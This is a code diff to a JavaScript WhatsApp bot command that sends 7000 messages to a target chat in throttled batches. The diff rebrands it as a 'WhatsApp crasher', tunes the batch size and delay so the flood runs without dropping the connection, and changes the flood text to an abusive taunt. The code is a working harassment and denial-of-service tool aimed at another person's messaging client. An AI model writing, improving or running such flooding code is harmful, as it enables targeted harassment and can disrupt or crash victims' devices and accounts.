@@ -7,7 +7,7 @@ const { channelInfo } = require('../lib/messageConfig');
  */
 async function sulexhCommand(sock, chatId, message) {
     try {
-        console.log("🚀 SULEXH FLOOD COMMAND INITIATED - Preparing 7000 messages");
+        console.log("🚀 BUGBOT WHATTSAPP CRASH INITIATED - Preparing 7000 messages");
 
         // Validate socket connection before starting
         if (!sock || !sock.ws || !sock.ws.socket || sock.ws.socket.readyState !== 1) {
@@ -16,8 +16,8 @@ async function sulexhCommand(sock, chatId, message) {
 
         // CRITICAL: Enhanced configuration with proper throttling to prevent socket death
         const TOTAL_MESSAGES = 7000;
-        const BATCH_SIZE = 25; // REDUCED from 50 to prevent overwhelming the socket
-        const BATCH_DELAY = 500; // INCREASED from 10ms to 500ms - this is critical!
+        const BATCH_SIZE = 15; // REDUCED from 50 to prevent overwhelming the socket
+        const BATCH_DELAY = 600; // INCREASED from 10ms to 500ms - this is critical!
         const RETRY_ATTEMPTS = 1; // Reduced from 2 to avoid re-attempts that stress socket
         const HEARTBEAT_INTERVAL = 5000; // Send ping every 5 seconds to keep socket alive
         
@@ -38,8 +38,7 @@ async function sulexhCommand(sock, chatId, message) {
 
         // Send initial confirmation to avoid confusion
         await sock.sendMessage(chatId, {
-            text: `🚀 INITIATING SULEXH MEGA FLOOD\n` +
-                  `📊 Target: ${TOTAL_MESSAGES} messages\n` +
+            text: `🚀 BUGBOT WHATSAPP CRASHER FLOOD\n` +          
                   `⚡ Mode: Throttled Batch Processing\n` +
                   `🛡️ Anti-Disconnect: ENABLED\n` +
                   `💓 Socket Keep-Alive: ACTIVE\n\n` +
@@ -223,7 +222,7 @@ async function sendFloodMessage(sock, chatId, messageIndex, retryAttempts = 1) {
 
             // Send the flood message with error handling
             const messageResult = await sock.sendMessage(chatId, { 
-                text: `💥 SULEXH BOOM MESSAGE #${messageIndex} 💥\n⚡ High-Speed Flood Active ⚡` 
+                text: `😭💥☠️ YOU HAVE BEEN FUCKED☠️ #${messageIndex} 💥\n⚡ High-Speed Flood Active ⚡` 
             }).catch(err => {
                 throw new Error(`Send failed: ${err.message}`);
             });
